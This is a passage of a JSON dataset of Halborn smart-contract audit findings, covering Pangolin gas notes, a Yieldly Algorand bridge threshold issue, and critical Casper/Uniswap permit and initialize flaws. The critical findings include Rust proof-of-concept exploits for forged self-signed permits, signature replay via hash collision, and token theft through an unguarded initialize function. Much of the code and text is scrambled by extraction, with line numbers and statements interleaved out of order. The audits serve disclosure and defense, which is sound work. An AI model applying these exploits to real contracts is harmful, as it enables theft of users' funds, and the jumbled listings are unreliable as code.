        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Since i is an uint, it is already initialized to 0. uint i = 0 reassigns the 0 to i which wastes gas. The same applies to the lower state variable shown below. Code Location: Airdrop.sol - Line 178: for (uint i = 0; i < addrs.length; i++){ PNG.sol - Line 373: uint32 lower = 0; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended not to initialize uint variables to 0 to save gas. For example: for (uint i; i < addrs.length; ++i){ Remediation Plan: SOLVED: 87781621d7294afeafd7a33916b4016dc1f3ed34. Pangolin team solved the issue in the commit id 27 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Exchange_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the TreasuryVester and PNG contracts, there are some functions marked as public that are never called directly within the contract itself or in any of their descendants: TreasuryVester.sol - distribute() (TreasuryVester.sol#122-163) PNG.sol - delegate() (PNG.sol#314-316) - delegateBySig() (PNG.sol#327-336) - getPriorVotes() (PNG.sol#355-387) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark them as external to reduce gas costs. Remediation Plan: SOLVED: f1fff4b75db0fe70450c55234418bd445834029d. Pangolin team solved the issue in the commit id 28 ",
        "labels": [
            "Halborn",
            "Pangolin_Exchange",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF THRESHOLD CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Bridge_Algorand_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the Yieldly.Finance, Three type of role is defined in the bridge contracts. They are named as Signatory and Validator and Dispatcher. Signatory and validator thresholds have been implemented in an editable way on the related functions. However, there is no limit on these functions. Code Location: Function sigThresholdProp Listing 1: HalbornTest.js (Lines ) 1 it ( \" Halborn Should propose threshold should change to 20 \" , async () => { return await new Promise ( async ( resolve , reject ) = > { try { let txn = await configs . sigThresholdProp ( account1 , sigAppId , 2 3 4 20) ; resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 }) . timeout (120000) ; } }) ; console . log ( err ); Function valThresholdProp Listing 2: HalbornTest.js (Lines ) 1 it ( \" Halborn Should propose threshold should change to 20 \" , async () => { return await new Promise ( async ( resolve , reject ) = > { try { let txn = await configs . valThresholdProp ( account1 , valAppId , 2 3 4 13 20 , sigAppId ); resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 11 }) . timeout (120000) ; } }) ; reject () ; assert . fail ( \" Failed to propose \" ); Example Functions: Listing 3 1 valThresholdProp 2 sigThresholdProp Risk Level: Likelihood - 3 Impact - 3 Recommendation: The limit definition range of threshold should be defined in the contract functionalities. Remediation Plan: SOLVED: Yieldly.Finance Team defined threshold limit on the functions. 14 MANUAL TESTING 15 During the manual testing multiple questions where considered while eval- uation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation.  Can we bypass Proxy restrictions and interact with the escrow di- rectly?  Can we manipulate transaction order with re-ordering?  Is there any missed address check? 4.1 TESTING SIGNATORY/VALIDATOR FUNCTIONS ACCESS CONTROL CHECK: During the test process, Two type of user have been defined on the contracts. One of them is defined as signatory and other one named as validator. In the testing process, Functions accessible to relevant users have been checked. A signatory user functions are shown in the below. Listing 4: Functions (Lines ) 1 function isSignatory () 2 function sigThresholdProp () 3 function signatoryProp () 4 function signatoryApprove () 5 function Next, privileged validator functions are extracted from the test cases and shown below. 16 G N I T S E T L A U N A M Listing 5: Functions (Lines ) 1 function isValidator () 2 function addValidatorProp () 3 function valThresholdProp () All functions are tested through Mocha framework. Two accounts provided by Yieldly .Finance team and one account has been created by Halborn team. After importing accounts into Mocha and AlgoSDK, Signatory and Validator workflows are evaluated according to the following code parts. Tests are completed through Algorand Testnet. Listing 6: IsValidator Check (Lines ) let txn = await configs . isValidator ( account1 , valAppId ); resolve ( txn ); } catch ( err ) { try { } }) ; reject () ; assert . fail ( \" Failed to propose \" ); 1 it ( \" Halborn Test Validator Check - PASS \" , async () = > { 2 return await new Promise ( async ( resolve , reject ) = > { 3 4 5 6 7 8 9 10 11 }) . timeout (120000) ; 12 13 it ( \" Halborn Test Validator Check - FAIL \" , async () = > { 14 return await new Promise ( async ( resolve , reject ) = > { 15 16 17 18 19 20 21 22 }) . timeout (120000) ; 23 } catch ( err ) { resolve () ; } }) ; try { let txn = await configs . isValidator ( account2 , valAppId ); reject ( assert . fail ( \" Should have failed \" )) ; Listing 7: Add Validatory and Approve Check (Lines ) 1 it ( \" Halborn Test Add Validator - PASS \" , async () = > { 2 return await new Promise ( async ( resolve , reject ) = > { 17 G N I T S E T L A U N A M try { } }) ; let txn = await configs . addValidatorProp ( account1 , valAppId , account2 , sigAppId ); resolve ( txn ); } catch ( err ) { reject () ; assert . fail ( \" Failed to propose \" ); 3 4 5 6 7 8 9 10 11 12 13 14 15 16 }) . timeout (120000) ; 17 18 it ( \" Halborn Test Validator Approve \" , async () = > { 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 }) . timeout (120000) ; reject () ; assert . fail ( \" Failed to propose \" ); ); resolve ( txn ); } catch ( err ) { account2 , valAppId , account2 , sigAppId let txn = await configs . validatorApprove ( } }) ; try { return await new Promise ( async ( resolve , reject ) = > { G N I T S E T L A U N A M Listing 8: Validator Threshold Change Check (Lines ) return await new Promise ( async ( resolve , reject ) = > { 1 it ( \" Halborn Added Validator Threshold Change Check \" , async () => { 2 3 4 let txn = await configs . valThresholdApprove ( account2 , try { valAppId , sigAppId ); resolve ( txn ); } catch ( err ) { reject () ; assert . fail ( \" Failed to propose \" ); } 5 6 7 8 9 18 }) ; 10 11 }) . timeout (120000) ; Listing 9: Signatory Check (Lines ) let txn = await configs . isSignatory ( account3 , sigAppId ); reject ( assert . fail ( \" Should have failed \" )) ; return await new Promise ( async ( resolve , reject ) = > { try { } catch ( err ) { resolve () ; 1 it ( \" Halborn Signatory Check \" , async () = > { 2 3 4 5 6 7 8 9 10 }) . timeout (120000) ; 11 12 it ( \" Halborn Add Signatory Check \" , async () = > { 13 14 15 } }) ; try { return await new Promise ( async ( resolve , reject ) = > { let txn = await configs . signatoryProp ( account1 , sigAppId , account2 ); resolve ( txn ); } catch ( err ) { 16 17 18 19 20 21 22 }) . timeout (120000) ; } }) ; reject () ; assert . fail ( \" Failed to propose \" ); Listing 10: Signatory Threshold Change (Lines ) G N I T S E T L A U N A M return await new Promise ( async ( resolve , reject ) = > { 1 it ( \" Halborn Signatory Threshold Change \" , async () = > { 2 3 4 try { let txn = await configs . sigThresholdProp ( account1 , sigAppId , 2) ; resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 11 }) . timeout (120000) ; } }) ; reject () ; assert . fail ( \" Failed to propose \" ); 19 By running the relevant codes on each function, the results were examined on Testnet. As a result of the tests performed in a limited time, no problems were observed in the flows. According to an analysis, It has been observed that the transactions produced by the functions against workflow manipulation are as expected. The Function enhancements are structured with roles. G N I T S E T L A U N A M 20 INPUT VALIDATION CHECK: During the test process, the signatory and validator functions have been reviewed by the auditors. In the testing process, Functions accessible to relevant users have been checked. Without pragma version definition, The contract will be interpreted as a version 1 contract. In the contracts, the pragma version 3 used. Bridge Signatory Contract Listing 11: (Lines 1) 1 # pragma version 3 2 3 4 // ** Begin 5 // ** Descrption : Checks if not first time created , if so then initialise all global variables 6 // **/ 7 int 0 8 txn ApplicationID 9 == 10 bz not_creation 11 byte \" Creator \" 12 txn Sender 13 app_global_put 14 byte \" Owner \" 15 txn Sender 16 app_global_put Bridge Validators Contract Listing 12: (Lines 1) 1 # pragma version 3 2 3 4 // ** Begin 5 // ** Descrption : Checks if not first time created , if so then initialise all global variables 6 // **/ 21 G N I T S E T L A U N A M 7 int 0 8 txn ApplicationID 9 == 10 bz not_creation 11 byte \" Creator \" 12 txn Sender 13 app_global_put 14 byte \" Owner \" 15 txn Sender 16 app_global_put OUT OF ORDER CHECK: In the smart contracts, the grouped transactions are examined by changing their orders. The relevant changes are completed on the test cases. Function valThresholdPropReverse Listing 13: HalbornTest.js (Lines ) return await new Promise ( async ( resolve , reject ) = > { 1 it ( \" valThresholdPropReverse - Reverse \" , async () = > { 2 3 4 let txn = await configs . valThresholdPropReverse ( account1 , try { valAppId , 2, sigAppId ); resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 11 }) . timeout (120000) ; } }) ; console ( \" ERROR Reverse valThresholdPropReverse \" ); console . log ( err ); Function signatoryApproveReverse 22 G N I T S E T L A U N A M Listing 14: HalbornTest.js (Lines ) 1 it ( \" signatoryApproveReverse - Reverse Orders \" , async () = > { 2 return await new Promise ( async ( resolve , reject ) = > { 3 4 let txn = await configs . signatoryApproveReverse ( account2 , try { sigAppId , account3 ); resolve ( txn ); } catch ( err ) { 5 6 7 8 9 10 }) . timeout (12000) ; } }) ; console . log ( \" ERROR - REVERSE \" ); Function addValidatorPropReverse Listing 15: HalbornTest.js (Lines ) let txn = await configs . addValidatorPropReverse ( return await new Promise ( async ( resolve , reject ) = > { try { account1 , valAppId , account2 , sigAppId 1 it ( \" addValidator Reverse Order \" , async () = > { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 }) . timeout (120000) ; ); resolve ( txn ); } catch ( err ) { } }) ; console ( \" ERROR Reverse addValidatorPropReverse \" ); console . log ( err ); Function Reverse Group Example Listing 16: Function Reverse Group Example (Lines ) 1 2 var txngroup = await algosdk . assignGroupID ([ application , verifier ]) ; 23 G N I T S E T L A U N A M 3 4 5 6 7 8 9 10 11 application . group = txngroup [1]. group ; verifier . group = txngroup [0]. group ; var signed2 = await application . signTxn ( account . sk ); var signed1 = await verifier . signTxn ( account . sk ); var bytes = concatArrays ( signed1 , signed2 ); var { txId : createTxId } = await algodClient The tests were carried out in interaction with Testnet over the Mocha. G N I T S E T L A U N A M As a result of the tests, Reversed orders are checked on the grouped transactions. 24 4.2 TESTING DISPATCHER FUNCTIONS ACCESS CONTROL CHECK: The Dispatcher is is designed to integrate a diverse set of blockchains There are three role based on the specialised for different needs. components. The final test carried out through dispatcher role. Listing 17: Bridge Dispatcher Teal (Lines ) var appArgs = []; appArgs . push ( algosdk . decodeAddress ( escrowAddress ). publicKey ); appArgs . push ( new Uint8Array ( getInt64Bytes ( proxyAppId )) ); txnList . push ( ) ); ..... configs . updateApplication ( account1 , optingAppId , program6 , program2 , appArgs 514 it ( \" Halborn - Dispatcher New Escrow \" , async () = > { 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 ); 544 .... 545 546 }) . timeout (120000) ; account1 , proxyAppId , program7 , program2 , appArgs5 return new Promise (( resolve ) => resolve () ); configs . updateApplication ( ) /* Update the proxy checks */ var appArgs5 = []; appArgs5 . push ( algosdk . decodeAddress ( escrowAddress ). publicKey ); appArgs5 . push ( new Uint8Array ( getInt64Bytes ( disAppId )) ); appArgs5 . push ( new Uint8Array ( getInt64Bytes ( optingAppId )) ); txnList . push ( 25 G N I T S E T L A U N A M Listing 18: (Lines ) 514 it ( \" Halborn - Dispatch From Account 1 and Vote Account 2 \" , async () => { return await new Promise ( async ( resolve , reject ) = > { let txn = await configs . releaseTxnApprove ( try { account1 , disAppId , escrowAddress , account2 , valAppId , assetId , 800000000 , proxyAppId 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 }) . timeout (120000) ; } catch ( err ) { resolve () ; } }) ; ); assert (! txn , \" Should have failed \" ); Listing 19: (Lines ) 514 it ( \" Halborn - Dispatch From Account 2 and Vote Account 3 \" , async 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 G N I T S E T L A U N A M () => { return await new Promise ( async ( resolve , reject ) = > { try { let txn = await configs . releaseTxnApproveNoTxn ( account2 , disAppId , account3 , valAppId , assetId , proxyAppId ); assert (! txn , \" Should have failed \" ); } catch ( err ) { resolve () ; } }) ; 26 530 }) . timeout (120000) ; According to an analysis, It has been observed that the transactions produced by the functions against workflow manipulation are as expected. The Function enhancements are structured with roles. G N I T S E T L A U N A M 27 INPUT VALIDATION CHECK: During the test process, the dispatcher function has been reviewed by the auditors. In the testing process, Functions accessible to relevant users have been checked. Without pragma version definition, The contract will be interpreted as a version 1 contract. In the dispatcher contract, the pragma version 3 used. Bridge Dispatcher Teal Listing 20: (Lines 1) 1 # pragma version 3 2 3 4 // ** Begin 5 // ** Descrption : Checks if not first time created , if so then initialise all global variables 6 // **/ 7 int 0 8 txn ApplicationID 9 == 10 bz not_creation 11 byte \" Creator \" 12 txn Sender 13 app_global_put 14 byte \" Owner \" 15 txn Sender 16 app_global_put G N I T S E T L A U N A M The Contract implementations should check GroupSize to make sure the size corresponds to the number of transactions the logic is expecting. Function voteFin 28 Listing 21: Bridge Dispatcher Teal (Lines 515,516,517) 514 voteFin : 515 global GroupSize 516 int 3 517 == 518 assert 519 int 1 520 return 521 522 failed : 523 int 0 524 return 525 finished : 526 int 1 527 return 528 According to test results, Group Size precondition checks are implemented over all contracts. The contract code should verify that the RekeyTo property of any trans- action is set to the ZeroAddress unless the contract is specifically involved in a rekeying operation. Listing 22: Bridge Dispatcher Teal (Lines ) 463 // ** Function : sendTxn 464 // ** Descrption : 465 // **/ 466 sendTxn : 467 gtxn 0 ApplicationID 468 byte \" G\" 469 app_global_get 470 == 471 assert 472 473 gtxn 3 TypeEnum 474 int 4 475 == G N I T S E T L A U N A M 29 476 assert 477 478 int 1 479 byte \" SendAmount \" 480 app_local_get 481 gtxn 3 AssetAmount 482 >= 483 assert 484 485 gtxn 2 RekeyTo 486 global ZeroAddress 487 == 488 gtxn 3 RekeyTo 489 global ZeroAddress 490 == 491 && 492 assert According to the static analysis results, necessary controls were applied on the ReKeyTo variables of contracts. G N I T S E T L A U N A M 30 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Algorand",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNLIMITED ALLOWANCE APPROVALS USING FORGED PERMITS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the permit function, inside the erc20 and pair contracts, does not check if the callers public_key equals to the owner public_key, which makes it vulnerable to self-signed messages. This vulnerability allows an attacker to self sign a message to spend funds from any account, including pairs of liquidity allowances. As a result, an adversary could steal the liquidity token from every user of the protocol and withdraw the funds from the pairs. Code Location: Down below is the code snippet from the permit function: Listing 1: /pair/pair/src/pair.rs (Lines 797,799) 795 fn permit ( 796 797 798 799 800 801 802 803 804 ) { & mut self , public_key : String , signature : String , owner : Key , spender : Key , value : U256 , deadline : u64 , let domain_separator : String = data :: get_domain_separator  () ; 805  () ; 806  ; 807 808 let permit_type_hash : String = data :: get_permit_type_hash let nonce : U256 = self . nonce ( Key :: from ( self . get_caller () )) let deadline_into_blocktime : BlockTime = BlockTime :: new ( deadline 17 809 810 . checked_mul (1000) . ok_or ( Error ::  UniswapV2CorePairMultiplicationOverFlow8 ) 811 812 813 814 815 816 817 . unwrap_or_revert () , ); let blocktime : BlockTime = runtime :: get_blocktime () ; if deadline_into_blocktime >= blocktime { let data : String = format! ( \" {}{}{}{}{}{} \" , permit_type_hash , owner , spender , value , nonce ,  deadline 818 819 820 821 822 ); let hash : [ u8 ; 32] = keccak256 ( data . as_bytes () ); let hash_string : String = hex :: encode ( hash ); let encode_packed : String = format! ( \" {}{} \" ,  domain_separator , hash_string ); 823 824 825  owner ); 826 827 828 829 let digest : [ u8 ; 32] = hash_message ( encode_packed ); let digest_string : String = hex :: encode ( digest ); let digest_key : String = format! ( \" {}{} \" , \" digest_ \" , set_key (& digest_key , digest_string ); self . set_nonce ( Key :: from ( self . get_caller () )) ; let result : bool = self . ecrecover ( public_key , signature , digest , Key  :: from ( self . get_caller () )) ; 830 831  ); 832 833 834 835 836 837 838 839 if result == true { Allowances :: instance () . set (& owner , & spender , value self . emit (& PAIREvent :: Approval { owner : owner , spender : spender , value : value , }) ; } else { // signature verification failed runtime :: revert ( Error ::  UniswapV2CorePairFailedVerification ); 840 841 842 843 844 845 } } else { // deadline is equal to or greater than blocktime runtime :: revert ( Error :: UniswapV2CorePairExpire ); } } 18 Risk Level: Likelihood - 5 Impact - 5 Proof Of Concept: Listing 2 get_permit_type_and_domain_separator ( NAME , contract_hash ); }; // Create the digest of the permit : ` victim_owner ` gives ` Key :: Hash ( hash ) => ContractHash :: new ( hash ) , _ => panic! ( \" Contract hash not found \" ) , // Config let amount = U256 :: from (100 u128 ); let deadline = U256 :: from (10000000000000000000 u128 ); let ( domain_separator , permit_type_hash ) = 0 #[ test ] 1 fn test_invalid_permit () { // Deploy the contract 2 let ( env , token , victim_owner , _ , _ ) = deploy_with_keys () ; 3 let attacker_spender = env . next_user_with_keys () ; 4 5 let contract_hash = match token . contract_hash () { 6 7 8 9 10 11 12 13 14 15 16  attacker_spender ` the right to spend ` amount ` tokens 17  Here we use the nonce of the attacker_spender 18 19 20 21 22 23 24 25 26 27 28  ecrecover 29  public . to_bytes () ; & domain_separator , & permit_type_hash , & Key :: from ( victim_owner . account_hash ). to_string () , & Key :: from ( attacker_spender . account_hash ). to_string () , amount , nonce , deadline , let nonce = token . nonce ( attacker_spender . account_hash ); // let attacker_public_key_bytes = attacker_spender . keypair . let ( digest , _digest_string ) = make_digest ( ); // Some manipulation to make the public_key understandable by 19 // Call permit with malicious payload // The attacker wants to give allowance to himself to spend ` let attacker_public_key_string = format_for_ecrecover (& // SELF SIGN WITH THE ATTACKER KEYPAIR ( ILLEGIT ) let signature_by_attacker_bytes = attacker_spender . keypair . let signature_by_attacker_string = format_for_ecrecover (& ); token . permit ( attacker_spender . account_hash , attacker_public_key_string , signature_by_attacker_string , Key :: from ( victim_owner . account_hash ) , Key :: from ( attacker_spender . account_hash ) , amount , deadline . as_u64 () , 30  attacker_public_key_bytes ); 31 32 33  sign (& digest ). to_bytes () ; 34  signature_by_attacker_bytes ); 35 36 37  amount ` tokens from ` victim_owner ` ( ILLEGIT ) 38 39 40 41 42 43 44 45 46 47 48  amount ` tokens from ` victim_owner ` ( ILLEGIT ) 49 50 51 52 53 54 55 56 57 58  amount ` tokens from ` victim_owner ` ( ILLEGIT ) 59 60 61 62 63 64 65 66  ) ) , amount , \" Allowance should be set \" , attacker_spender . account_hash , Key :: from ( victim_owner . account_hash ) , Key :: from ( attacker_spender . account_hash ) , amount , token . transfer_from ( token . allowance ( assert_eq! ( ); ); Key :: from ( victim_owner . account_hash ) , Key :: from ( attacker_spender . account_hash ) // Now ` attacker_spender ` should have the right to spend ` // Now ` attacker_spender ` should have the right to spend ` // Now ` attacker_spender ` should have ` amount ` tokens ( ILLEGIT 20 assert_eq! ( token . balance_of ( Key :: from ( attacker_spender . account_hash )) amount , \" Balance should be set \" , ); 67 68  , 69 70 71 72 } Recommendation: It is recommended to implement security controls to ensure owner: Key and owner_pubkey: Public Key belong to the same account. Reference: Uniswap permit implementation Remediation Plan: SOLVED: The issue was solved in the commit 24dd7 by removing the permit function. 21 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Critical"
        ]
    },
    {
        "title": "SIGNATURE REPLAY USING HASH COLLISION IN PERMIT FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that inside the erc20 and pair contracts, the permit function creates data String without any delimiters between parameters, which makes it vulnerable to hash collision attacks. Using this vulnerability, an attacker can use the same signature more than once with different values to steal tokens from the owner. To explain this vulnerability with an example; data is created as the following: value, nonce, deadline. permit_type_hash, owner, spender, if respectively these parameters are; test X Y 10100 0 1100 then the string becomes testXY101000100 and then it becomes a hash. However, the same string can be obtained using the following parameters, even with an updated nonce value. test X Y 101000 1 100 => testXY101000100 Therefore, an attacker can first use the first allowance, and then can manipulate the value and deadline parameters to be compatible with nonce in order to obtain the same data string. An attacker can use the same hash unlimited times with different amounts. 22 Code Location: Down below is the code snippet from the permit function: Listing 3: /pair/pair/src/pair.rs (Lines 815-820) 795 fn permit ( 796 797 798 799 800 801 802 803 804 ) { & mut self , public_key : String , signature : String , owner : Key , spender : Key , value : U256 , deadline : u64 , let domain_separator : String = data :: get_domain_separator  () ; 805  () ; 806  ; 807 808 809 810 let permit_type_hash : String = data :: get_permit_type_hash let nonce : U256 = self . nonce ( Key :: from ( self . get_caller () )) let deadline_into_blocktime : BlockTime = BlockTime :: new ( deadline . checked_mul (1000) . ok_or ( Error ::  UniswapV2CorePairMultiplicationOverFlow8 ) 811 812 813 814 815 816 817 . unwrap_or_revert () , ); let blocktime : BlockTime = runtime :: get_blocktime () ; if deadline_into_blocktime >= blocktime { let data : String = format! ( \" {}{}{}{}{}{} \" , permit_type_hash , owner , spender , value , nonce ,  deadline 818 819 820 821 822 ); let hash : [ u8 ; 32] = keccak256 ( data . as_bytes () ); let hash_string : String = hex :: encode ( hash ); let encode_packed : String = format! ( \" {}{} \" ,  domain_separator , hash_string ); 823 824 825  owner ); 826 let digest : [ u8 ; 32] = hash_message ( encode_packed ); let digest_string : String = hex :: encode ( digest ); let digest_key : String = format! ( \" {}{} \" , \" digest_ \" , set_key (& digest_key , digest_string ); 23 827 828 829 self . set_nonce ( Key :: from ( self . get_caller () )) ; let result : bool = self . ecrecover ( public_key , signature , digest , Key  :: from ( self . get_caller () )) ; 830 831  ); 832 833 834 835 836 837 838 839 if result == true { Allowances :: instance () . set (& owner , & spender , value self . emit (& PAIREvent :: Approval { owner : owner , spender : spender , value : value , }) ; } else { // signature verification failed runtime :: revert ( Error ::  UniswapV2CorePairFailedVerification ); 840 841 842 843 844 845 } } else { // deadline is equal to or greater than blocktime runtime :: revert ( Error :: UniswapV2CorePairExpire ); } } Risk Level: Likelihood - 5 Impact - 5 Proof Of Concept: Listing 4 // Deploy the contract let ( env , _proxy , _proxy2 , token , owner , _factory_hash ) 0 #[ test ] 1 fn test_pair_permit_hash_collision () { 2 3  deploy_with_keys () ; 4 5 6 7 let spender = env . next_user_with_keys () ; let contract_hash = match token . self_contract_hash () { Key :: Hash ( hash ) => ContractHash :: new ( hash ) , _ => panic! ( \" Contract hash not found \" ) , = 24 }; ); get_permit_type_and_domain_separator ( NAME , contract_hash ); // Some manipulation to make the public_key understandable by let ( domain_separator , permit_type_hash ) = let ( digest , _digest_string ) = make_digest ( let amount = U256 :: from (900001 u128 ); let deadline : u64 = 11000000000000; let nonce = token . nonce ( owner . account_hash ); println! (\" {:?} \" , nonce ); & domain_separator , & permit_type_hash , & Key :: from ( owner . account_hash ). to_string () , & Key :: from ( spender . account_hash ). to_string () , amount , nonce , deadline , 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ecrecover 30 31  ); 32 33  ecrecover , SIGN THE DIGEST WITH THE OWNER ' S PRIVATE KEY 34 35 36 37 38  tokens 39  signature : {:?} \" , amount , deadline , signature_string . clone () ); 40 41 42 43 44 45 46 owner . account_hash , public_key_string . clone () , signature_string . clone () , Key :: from ( owner . account_hash ) , Key :: from ( spender . account_hash ) , amount , println! (\" Permit call with amount :{:?} , deadline : {:?} , // Call the permit function from the ` owner ` account // He wants to give allowance to ` spender ` to spend ` amount ` // Some manipulation to make the signature understandable by let public_key_bytes = owner . keypair . public . to_bytes () ; let public_key_string = format_for_ecrecover (& public_key_bytes let signature_bytes = owner . keypair . sign (& digest ). to_bytes () ; let signature_string = format_for_ecrecover (& signature_bytes ); token . permit ( 25 deadline , println! () ; println! (\" Spenders ( attacker ) first allowance : {:?} \" , token . ); // Now ` spender ` should have the right to spend ` amount ` let nonce = token . nonce ( owner . account_hash ); println! (\" Updated nonce : {:?} \" , nonce ); println! () ; let amount = U256 :: from (9000010 u128 ); let deadline = 1000000000000; println! (\" Spender adjust the amount and deadline variables in 47 48 49  tokens 50  allowance ( Key :: from ( owner . account_hash ) , Key :: from ( spender .  account_hash ))); 51 52 53 54 55 56 57 58 59  a way to make signature hash same . \" ); println! (\" Spender recalls the permit call same signature but 60  edited parameters amount :{:?} , deadline : {:?} , signature : {:?} \" ,  amount , deadline , signature_string . clone () ); 61 62 63 64 65 66 67 68 69 70  amount is x10 ) : {:?} \" , token . allowance ( Key :: from ( owner . account_hash  ) , Key :: from ( spender . account_hash ))) ; 71 } owner . account_hash , public_key_string . clone () , signature_string . clone () , Key :: from ( owner . account_hash ) , Key :: from ( spender . account_hash ) , amount , deadline , ); println! (\" Updated spender allowance after hash collision ( token . permit ( Recommendation: It is recommended to add delimiters between parameters while creating the data strings, such as let data: String = format!(\"{}:::{}:::{}:::{}:::{}:::{}\",permit_type_hash , owner, spender, value, nonce, deadline); 26 Remediation Plan: SOLVED: The issue was solved in the commit 24dd7 by removing the permit function. 27 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Critical"
        ]
    },
    {
        "title": "MISSING ACCESS CONTROL AND VULNERABLE LOGICAL DESIGN ALLOWS FOR STEALING TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that a pair of tokens does not belong to a unique pair contract, and inside the pair contract, the initialize function is used to set the contract pair of tokens. However, liquidity tokens are the same in each token pair; therefore an attacker can create 2 dummy erc20 contracts then use the initialize function and set pair contracts tokens and mint an infinite amount of liquidity tokens. Afterward, the attacker can again set the pair contracts tokens to normal tokens, and steal tokens from the pair. Code Location: Down below is the code snippet from the initialize function: Listing 5: /pair/pair/src/pair.rs 1170 fn initialize (& mut self , token0 : Key , token1 : Key ,  factory_hash : Key ) { 1171 1172 1173 1174 1175 1176 1177 1178 1179 1180 let factory_hash_getter : Key = self . get_factory_hash () ; if factory_hash == factory_hash_getter { data :: set_token0 ( token0 ); data :: set_token1 ( token1 ); } else { // ( UniswapV2 : FORBIDDEN ) runtime :: revert ( Error :: UniswapV2CorePairForbidden ); } } 28 Risk Level: Likelihood - 5 Impact - 5 Proof Of Concept: Listing 6 let attacker = env . next_user () ; let ( env , proxy , _proxy2 , token , owner , factory_hash ) = let token1 = deploy_token1 (& env ); // normal token let token1_contract_hash = Key :: Hash ( token1 . contract_hash () ); let token1_package_hash = Key :: Hash ( token1 . package_hash () ); // deploy tokens let token0 = deploy_token0 (& env ); // normal token let token0_contract_hash = Key :: Hash ( token0 . contract_hash () ); let token0_package_hash = Key :: Hash ( token0 . package_hash () ); 0 // This test case exploits the missing access control and also  logical flaw in pair . initialize () function . 1 #[ test ] 2 fn poc_malicious_token_pair_mint_steal_liquidity () { 3  deploy1 () ; 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ); 23  to_formatted_string () ); 24 25 26  owner initialize pair ( token0 - token1 ) 27 28 let amount0 : U256 = 30000. into () ; let amount1 : U256 = 2500000. into () ; println! () ; println! (\" {} \" ,\" - Roles - \"); println! (\" {}{} \" , \" User account : \" , owner . to_formatted_string () println! () ; println! (\" {} \" , \" User initialize pair ( token0 - token1 ) \" ); // let factory_hash = Key :: Hash ( factory_hash . package_hash () ); println! (\" {}{} \" , \" Attacker account : \" , owner . token . initialize ( owner , 29 println! (\" {}{:?}{} \" , \" User mints \" , amount0 , \" token0 - token1 ); ); proxy . mint_with_caller ( ); proxy . mint_with_caller ( token0_package_hash , token1_package_hash , factory_hash , owner , token0_contract_hash , Key :: from ( token . self_package_hash () ) , amount0 , owner , token1_contract_hash , Key :: from ( token . self_package_hash () ) , amount0 , 29 30 31 32 33 34  to pair ( Mint is used at this point but logic is same with  transfer ) \"); 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  liquidity 51  token . balance_of ( owner )) ; 52  token . self_package_hash () )) ; 53  ; 54 55 56 57  which has no value token2 and token3 \"); 58 59 60 61 62 63 64 65 & env , \" erc20 - token . wasm \" , \" token2_contract \" , attacker , let decimals : u8 = 18; let init_total_supply : U256 = 0. into () ; let token2 = TestContract :: new ( println! () ; println! (\" {} \" , \" User calls pair - mint () to add liquidity \" ); token . mint_no_ret ( owner , owner ); // normal user ( owner ) adds println! () ; println! (\" {} \" , \" -- Exploitation begins at this point -- \"); println! () ; println! (\" {} \" , \" 1. First attacker deploys 2 dummy ERC20 tokens println! (\" {}{:?} \" , \" User ' s pair balance ( liquidity tokens ): \" , println! (\" {}{:?} \" , \" Pair total supply : \" , token . balance_of ( println! (\" {} \" , \" Attacker ' s pair balance ( liquidity tokens ): 0\" ) 30 \" initial_supply \" => init_total_supply , \" name \" => \" token2 \" , \" symbol \" => \" tk2 \" , \" decimals \" => decimals ); let token2_contract_hash = Key :: Hash ( token2 . contract_hash () ); let token2_package_hash = Key :: Hash ( token2 . package_hash () ); \" initial_supply \" => init_total_supply , \" name \" => \" token3 \" , \" symbol \" => \" tk3 \" , \" decimals \" => decimals ); let token3_contract_hash = Key :: Hash ( token3 . contract_hash () ); let token3_package_hash = Key :: Hash ( token3 . package_hash () ); println! () ; println! (\" {} \" , \" 2. Attacker calls pair . initialize () and sets let token3 = TestContract 